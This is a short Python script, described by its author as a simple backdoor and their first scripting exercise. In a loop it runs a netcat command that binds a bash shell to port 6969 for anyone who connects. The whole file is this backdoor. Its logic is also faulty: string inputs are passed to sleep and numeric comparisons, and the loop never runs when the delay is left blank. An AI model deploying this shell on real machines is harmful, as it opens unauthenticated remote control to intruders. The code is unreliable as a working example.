"""
A small, simple backdoor that was my introduction to scripting. 
"""

import time
import os
import subprocess

delay = 5
limit = 0

delay = input("How many seconds should I wait to re-open the beacon?(5s default): ")
limit = input("should I stop after a certian amount of iterations? (No limit default): ")

if delay == '':
    delay = 1

elif limit == '' or limit == 0:
    while True:
        print("Refeshing Beacon")
        os.system("nc -l -p 6969 -e /bin/bash")
        time.sleep(delay)

else:
    while limit > 0:
        print("Refeshing Beacon")
        os.system("nc -l -p 6969 -e /bin/bash")
        time.sleep(delay)
        limit -= 1
